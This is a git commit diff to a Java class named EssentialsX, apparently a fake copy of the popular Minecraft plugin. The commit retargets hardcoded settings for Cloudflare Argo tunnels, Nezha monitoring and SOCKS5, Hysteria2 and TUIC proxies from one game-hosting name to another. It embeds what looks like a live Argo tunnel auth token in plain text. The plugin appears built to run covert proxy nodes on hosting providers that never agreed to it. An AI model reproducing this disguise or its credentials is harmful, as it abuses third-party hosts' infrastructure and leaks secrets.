3d7751ff3c7235acb896e5d0df0b0ed09dba7dbc
casaos <30998709+andyzhouyang198611@users.noreply.github.com>
2026-04-17 09:03:21 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "altare.19861123.tech");
-        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiOTk0NTA4OWYtOTYxYy00MGU1LTliOGItZDFlNjMwYzZjNjcyIiwicyI6Ik9UTXhNemhrTW1VdFl6Wm1NUzAwTldOakxXRXhaV1F0TjJJeE5ETXpNMkpoTm1aaCJ9");
+        env.put("ARGO_DOMAIN", "syntexhosting.19861123.tech");
+        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiNGI5NWE5YTgtYzc3Ni00OWUxLWEwMDQtNGY0MThiNTcwZDc2IiwicyI6Ik1qQTRaVGhqWmpVdFlUZzFPQzAwTmpBMExXRTVNMll0TVRJME1EWTBNalk0TlROaiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "altare");
+        env.put("NAME", "syntexhosting");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
